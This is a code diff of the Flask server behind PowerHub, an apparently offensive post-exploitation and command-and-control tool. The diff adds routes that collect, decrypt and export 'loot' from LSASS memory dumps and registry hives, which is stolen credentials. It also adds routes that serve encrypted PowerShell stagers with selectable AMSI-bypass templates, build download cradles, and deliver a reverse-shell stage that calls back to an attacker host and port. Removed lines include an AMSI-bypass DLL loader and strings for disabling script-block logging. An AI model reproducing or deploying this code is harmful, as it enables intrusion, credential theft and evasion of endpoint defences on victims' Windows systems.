@@ -1,5 +1,6 @@
 
 from base64 import b64encode
+from binascii import unhexlify
 from datetime import datetime
 import logging
 import os
@@ -7,27 +8,27 @@ import shutil
 from tempfile import TemporaryDirectory
 
 from flask import Flask, render_template, request, Response, redirect, \
-         send_from_directory, flash, make_response, abort
+         send_from_directory, flash, make_response, abort, jsonify
 
+from werkzeug.exceptions import BadRequestKeyError
 from werkzeug.serving import WSGIRequestHandler, _log
 from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_socketio import SocketIO  # , emit
-try:
-    from flask_sqlalchemy import SQLAlchemy
-except ImportError:
-    pass
 
-from powerhub.settings import init_settings
-from powerhub.clipboard import init_clipboard
-from powerhub.stager import modules, stager_str, callback_url, \
+from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
+        delete_loot, get_clip_entry_list
+from powerhub.stager import modules, build_cradle, callback_urls, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
-from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME
-from powerhub.tools import encrypt, compress, get_secret_key
+from powerhub.directories import UPLOAD_DIR, DB_FILENAME, \
+        XDG_DATA_HOME, STATIC_DIR
+from powerhub.tools import encrypt, compress, KEY
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
 from powerhub.receiver import ShellReceiver
+from powerhub.loot import save_loot, get_lsass_goodies, get_hive_goodies, \
+        parse_sysinfo
 from powerhub.args import args
 from powerhub.logging import log
 from powerhub._version import __version__
@@ -43,12 +44,14 @@ app.config.update(
 )
 
 try:
+    from flask_sqlalchemy import SQLAlchemy
     db = SQLAlchemy(app)
-except NameError:
+    init_db(db)
+except ImportError as e:
+    log.error("You have unmet dependencies, database will not be available")
+    log.exception(e)
     db = None
-init_settings(db)
-cb = init_clipboard(db=db)
-KEY = get_secret_key()
+cb = get_clipboard()
 
 socketio = SocketIO(
     app,
@@ -58,9 +61,6 @@ socketio = SocketIO(
 if not args.DEBUG:
     logging.getLogger("socketio").setLevel(logging.WARN)
     logging.getLogger("engineio").setLevel(logging.WARN)
-
-need_proxy = True
-need_tlsv12 = (args.SSL_KEY is not None)
 
 
 def push_notification(type, msg, title, subtitle="", **kwargs):
@@ -104,6 +104,7 @@ def run_flask_app():
 
 @app.template_filter()
 def debug(msg):
+    """This is a function for debugging statements in jinja2 templates"""
     if args.DEBUG:
         return msg
     return ""
@@ -111,9 +112,25 @@ def debug(msg):
 
 @app.template_filter()
 def nodebug(msg):
+    """This is a function for (no) debugging statements in jinja2 templates"""
     if not args.DEBUG:
         return msg
     return ""
+
+
+@app.template_filter()
+def rc4encrypt(msg):
+    """This is a function for encrypting strings in jinja2 templates"""
+    return b64encode(encrypt(msg.encode(), KEY)).decode()
+
+
+@app.template_filter()
+def rc4byteencrypt(data):
+    """This is a function for encrypting bytes in jinja2 templates
+
+    data must be hexascii encoded.
+    """
+    return b64encode(encrypt(b64encode(unhexlify(data)), KEY)).decode()
 
 
 @app.route('/')
@@ -125,10 +142,10 @@ def index():
 @app.route('/hub')
 @requires_auth
 def hub():
+    clip_entries = get_clip_entry_list(cb)
     context = {
-        "dl_str": stager_str(need_proxy=need_proxy,
-                             need_tlsv12=need_tlsv12),
         "modules": modules,
+        "clip_entries": clip_entries,
         "repositories": list(repositories.keys()),
         "SSL": args.SSL_KEY is not None,
         "AUTH": args.AUTH,
@@ -141,9 +158,6 @@ def hub():
 @requires_auth
 def receiver():
     context = {
-        "dl_str": stager_str(flavor='reverse_shell',
-                             need_proxy=need_proxy,
-                             need_tlsv12=need_tlsv12),
         "SSL": args.SSL_KEY is not None,
         "shells": shell_receiver.active_shells(),
         "AUTH": args.AUTH,
@@ -152,10 +166,33 @@ def receiver():
     return render_template("receiver.html", **context)
 
 
+@app.route('/loot')
+@requires_auth
+def loot_tab():
+    # turn sqlalchemy object 'lootbox' into dict/array
+    lootbox = get_loot()
+    loot = [{
+        "nonpersistent": db is None,
+        "id": l.id,
+        "lsass": get_lsass_goodies(l.lsass),
+        "lsass_full": l.lsass,
+        "hive": get_hive_goodies(l.hive),
+        "hive_full": l.hive,
+        "sysinfo": parse_sysinfo(l.sysinfo,)
+    } for l in lootbox]
+    context = {
+        "loot": loot,
+        "AUTH": args.AUTH,
+        "VERSION": __version__,
+    }
+    return render_template("loot.html", **context)
+
+
 @app.route('/clipboard')
 @requires_auth
 def clipboard():
     context = {
+        "nonpersistent": db is None,
         "clipboard": list(cb.entries.values()),
         "AUTH": args.AUTH,
         "VERSION": __version__,
@@ -212,13 +249,23 @@ def del_clipboard():
     return ""
 
 
+@app.route('/clipboard/edit', methods=["POST"])
+@requires_auth
+def edit_clipboard():
+    """Edit a clipboard entry"""
+    id = int(request.form.get("id"))
+    content = request.form.get("content")
+    cb.edit(id, content)
+    return ""
+
+
 @app.route('/clipboard/del-all', methods=["POST"])
 @requires_auth
 def del_all_clipboard():
     """Delete all clipboard entries"""
     for id in list(cb.entries.keys()):
         cb.delete(id)
-    return ""
+    return redirect("/clipboard")
 
 
 @app.route('/clipboard/export', methods=["GET"])
@@ -235,6 +282,29 @@ def export_clipboard():
         result,
         content_type='text/plain; charset=utf-8'
     )
+
+
+@app.route('/loot/export', methods=["GET"])
+@requires_auth
+def export_loot():
+    """Export all loot entries"""
+    lootbox = get_loot()
+    loot = [{
+        "id": l.id,
+        "lsass": get_lsass_goodies(l.lsass),
+        "hive": get_hive_goodies(l.hive),
+        "sysinfo": parse_sysinfo(l.sysinfo,)
+    } for l in lootbox]
+    return jsonify(loot)
+
+
+@app.route('/loot/del-all', methods=["POST"])
+@requires_auth
+def del_all_loog():
+    """Delete all loot entries"""
+    # TODO get confirmation by user
+    delete_loot()
+    return redirect("/loot")
 
 
 @app.route('/m')
@@ -260,80 +330,109 @@ def payload_m():
 @app.route('/0')
 def payload_0():
     """Load 0th stage"""
-    encrypted_strings = [
-        "Bypass.AMSI",
-        "System.Management.Automation.Utils",
-        "cachedGroupPolicySettings",
-        "NonPublic,Static",
-        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
-        "EnableScriptBlockLogging",
-    ]
-    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
-                         in encrypted_strings]
+
+    try:
+        clipboard_id = int(request.args.get('c'))
+        exec_clipboard_entry = cb.entries[clipboard_id].content
+    except TypeError:
+        exec_clipboard_entry = ""
+    amsi_bypass = request.args['a']
+    amsi_template = ""
+    # prevent path traversal
+    if not (amsi_bypass == 'none'
+            or '.' in amsi_bypass
+            or '/' in amsi_bypass
+            or '\\' in amsi_bypass):
+        amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
     context = {
         "modules": modules,
-        "callback_url": callback_url,
+        "callback_url": callback_urls[request.args['t']],
+        "transport": request.args['t'],
         "key": KEY,
-        "strings": encrypted_strings,
+        "amsibypass": amsi_template,
         "symbol_name": symbol_name,
-        "stage2": 'r' if 'r' in request.args else '1',
+        "stage2": request.args["f"],
+        "exec_clipboard_entry": exec_clipboard_entry,
     }
     result = render_template(
-                    "amsi.ps1",
+                    "powershell/stager.ps1",
                     **context,
                     content_type='text/plain'
     )
     return result
 
 
-@app.route('/1')
-def payload_1():
-    """Load 1st stage"""
+@app.route('/h')
+def payload_h():
+    """Load next stage of the Hub"""
+    try:
+        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
+            profile = f.read()
+    except Exception:
+        profile = ""
     context = {
         "modules": modules,
         "webdav_url": webdav_url,
         "symbol_name": symbol_name,
+        "profile": profile,
+        "transport": request.args['t'],
     }
     result = render_template(
-                    "payload.ps1",
+                    "powershell/powerhub.ps1",
                     **context,
     ).encode()
     result = b64encode(encrypt(result, KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
-@app.route('/l')
-def payload_l():
-    """Load the AMSI Bypass DLL"""
-    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa
-
-    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
-    with open(filename, 'rb') as f:
-        DLL = f.read()
-    DLL = b64encode(encrypt(b64encode(DLL), KEY))
-    return Response(DLL, content_type='text/plain; charset=utf-8')
+@app.route('/ml')
+def hub_modules():
+    """Return list of hub modules"""
+    global modules
+    modules = import_modules()
+    context = {
+        "modules": modules,
+    }
+    result = render_template(
+                    "powershell/modules.ps1",
+                    **context,
+    ).encode()
+    result = b64encode(encrypt((result), KEY))
+    return Response(result, content_type='text/plain; charset=utf-8')
 
 
 @app.route('/dlcradle')
 def dlcradle():
-    global need_proxy, need_tlsv12
-    need_proxy = request.args['proxy'] == 'true'
-    need_tlsv12 = request.args['tlsv12'] == 'true'
-    return stager_str(need_proxy=need_proxy, need_tlsv12=need_tlsv12)
+    try:
+        return build_cradle(request.args, flavor=request.args["flavor"])
+    except BadRequestKeyError as e:
+        log.error("Unknown key, must be one of %s" % str(request.args))
+        return (str(e), 500)
 
 
 @app.route('/u', methods=["POST"])
 def upload():
     """Upload one or more files"""
     file_list = request.files.getlist("file[]")
-    noredirect = "noredirect" in request.args
+    is_from_script = "script" in request.args
+    loot = "loot" in request.args and request.args["loot"]
     for file in file_list:
         if file.filename == '':
             return redirect(request.url)
         if file:
-            save_file(file)
-    push_notification("reload", "Update Fileexchange", "")
-    if noredirect:
+            if loot:
+                loot_id = request.args["loot"]
+                log.info("Loot received - %s" % loot_id)
+                save_loot(file, loot_id, encrypted=is_from_script)
+            else:
+                log.info("File received - %s" % file.filename)
+                save_file(file, encrypted=is_from_script)
+    if loot:
+        decrypt_hive(loot_id)
+        push_notification("reload", "Update Loot", "")
+    else:
+        push_notification("reload", "Update Fileexchange", "")
+    if is_from_script:
         return ('OK', 200)
     else:
         return redirect('/fileexchange')
@@ -393,19 +492,20 @@ def reload_modules():
 
 
 @app.route('/r', methods=["GET"])
-def reverse_shell():
-    """Spawn a reverse shell"""
+def payload_r():
+    """Load next stage of the Reverse Shell"""
     context = {
-        "dl_cradle": stager_str().replace('$K', '$R'),
         "IP": args.URI_HOST,
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
         "PORT": str(args.REC_PORT),
         "key": KEY,
+        "callback_url": callback_urls[request.args['t']],
+        "transport": request.args["t"],
         "symbol_name": symbol_name,
     }
     result = render_template(
-                    "reverse-shell.ps1",
+                    "powershell/reverse-shell.ps1",
                     **context,
     ).encode()
     result = b64encode(encrypt(result, KEY))
@@ -426,9 +526,9 @@ def shell_log():
         'content': content,
     }
     if content == 'html':
-        return render_template("shell-log.html", **context)
+        return render_template("receiver/shell-log.html", **context)
     elif content == 'raw':
-        response = make_response(render_template("shell-log.html",
+        response = make_response(render_template("receiver/shell-log.html",
                                  **context))
         response.headers['Content-Disposition'] = \
             'attachment; filename=' + shell_id + ".log"
@@ -462,9 +562,19 @@ def shell_kill_all():
 def shell_card():
     shell_id = request.args["shell-id"]
     shell = shell_receiver.get_shell_by_id(shell_id)
-    return render_template("receiver-shellcard.html", s=shell)
+    return render_template("receiver/receiver-shellcard.html", s=shell)
 
 
 @socketio.on('connect', namespace="/push-notifications")
 def test_connect():
     log.debug("Websockt client connected")
+
+
+@app.route('/static/<filename>')
+def server_static(filename):
+    try:
+        return send_from_directory(STATIC_DIR,
+                                   filename,
+                                   as_attachment=True)
+    except PermissionError:
+        abort(403)
